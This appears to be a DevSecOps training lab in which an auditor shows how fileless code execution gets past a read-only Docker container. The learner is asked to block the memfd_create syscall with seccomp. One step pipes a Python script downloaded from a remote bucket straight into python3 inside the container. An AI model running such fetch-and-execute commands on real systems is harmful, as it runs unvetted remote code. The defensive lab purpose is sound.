# WhizCash Bank

WhizCash Bank had its annual security audit. The result was forwarded to Alice, a DevSecOps Engineer in WhizCash Bank.

# Result of the External Security Audit

After the external security audit of the bank's infrastructure, a security vulnerability was found. Although the containers were started with the read-only flag, an auditor was able to execute a syscall.

## How does the exploit work

The auditor gives Alice the following instructions on how the exploit can currently be executed:

> **_NOTE:_**  To see what happens, Alice has to activate an audit profile for seccomp provided here [audit.json](./profiles/audit.json).

1. Starting a container with read-only file system and audit logs activated:

        sudo docker run --name fileless -d -it --rm --read-only --security-opt seccomp=[path-to-audit-json]/audit.json python:3.9.1

2. Run the following command to see which syscalls are executed

        sudo journalctl -f | grep audit

3. Run the exploit provided by the auditor:

        docker exec -it fileless /bin/bash
    
    and execute the exploit inside the container:

        curl -s https://sec4dev.s3.eu-central-1.amazonaws.com/output.py | python3

In the journalctl log you should see a syscall with the id 319:

    Oct 26 18:47:40 VM-204e5f1e-327f-4a61-a86b-dbf904cf8fa8 audit[53400]: SECCOMP auid=4294967295 uid=0 gid=0 ses=4294967295 subj=? pid=53400 comm="python3" exe="/usr/local/bin/python3.9" sig=0 arch=c000003e syscall=319 compat=0 ip=0x7fa1b4f78347 code=0x7ffc0000

## Alice's task

Alice is responsible for closing this security gap. In order to test the vulnerability, the auditor has provided Alice with a test exploit. She should find a way to prevent the syscall memfd_create so that the security gap can be closed.